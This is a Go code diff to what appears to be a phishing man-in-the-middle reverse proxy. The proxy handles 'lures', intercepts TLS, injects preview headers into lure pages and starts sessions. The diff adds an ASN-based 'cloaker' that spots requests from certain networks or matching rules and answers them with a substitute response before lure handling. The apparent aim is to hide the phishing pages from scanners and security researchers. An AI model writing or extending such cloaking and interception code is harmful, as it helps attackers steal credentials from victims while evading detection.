@@ -43,6 +43,7 @@ import (
 	http_dialer "github.com/mwitkow/go-http-dialer"
 
 	"github.com/s4l1hs/olta/pkg/proxy/database"
+	"github.com/s4l1hs/olta/pkg/proxy/middleware/asncloak"
 	utlstransport "github.com/s4l1hs/olta/pkg/proxy/transport/utls"
 	"golang.org/x/net/proxy"
 
@@ -91,6 +92,7 @@ type HttpProxy struct {
 	turnstile         bool
 	rateLimit         int
 	rateWindow        time.Duration
+	cloaker           *asncloak.Middleware
 	outboundTransport *utlstransport.Transport
 }
 
@@ -200,6 +202,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	})
 
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
+	p.Proxy.OnRequest().DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+		// The SNI worker creates a synthetic CONNECT request before goproxy
+		// decrypts the browser's HTTP traffic. Only classify the resulting HTTP
+		// requests, which contain the client headers used by the cloaker.
+		if req.Method == http.MethodConnect || p.cloaker == nil {
+			return req, nil
+		}
+		match, matched := p.cloaker.Evaluate(req)
+		if !matched {
+			return req, nil
+		}
+		if match.Network != nil {
+			if match.Network.ASN != 0 {
+				log.Warning("cloaker: matched %s request from %s (%s, AS%d)", match.Network.Category, match.IP, match.Network.Organization, match.Network.ASN)
+			} else {
+				log.Warning("cloaker: matched %s request from %s (%s)", match.Network.Category, match.IP, match.Network.Organization)
+			}
+		} else {
+			log.Warning("cloaker: matched request rule %s (%s)", match.Rule, match.Detail)
+		}
+		return req, p.cloaker.Response(req)
+	})
 	p.Proxy.OnRequest().DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 		ctx.RoundTripper = proxyRoundTripper{transport: p.outboundTransport}
 		return req, nil
@@ -2029,6 +2053,22 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 		body = []byte(head_re.ReplaceAllString(string(body), "<head>\n"+og_inject))
 	}
 	return body
+}
+
+// ConfigureCloaker installs the request classifier used by the first goproxy
+// request callback. Call it before Start so requests are filtered before lure
+// validation and session initialization.
+func (p *HttpProxy) ConfigureCloaker(config asncloak.Config) error {
+	if !config.Enabled {
+		p.cloaker = nil
+		return nil
+	}
+	cloaker, err := asncloak.New(config)
+	if err != nil {
+		return err
+	}
+	p.cloaker = cloaker
+	return nil
 }
 
 func (p *HttpProxy) Start() error {
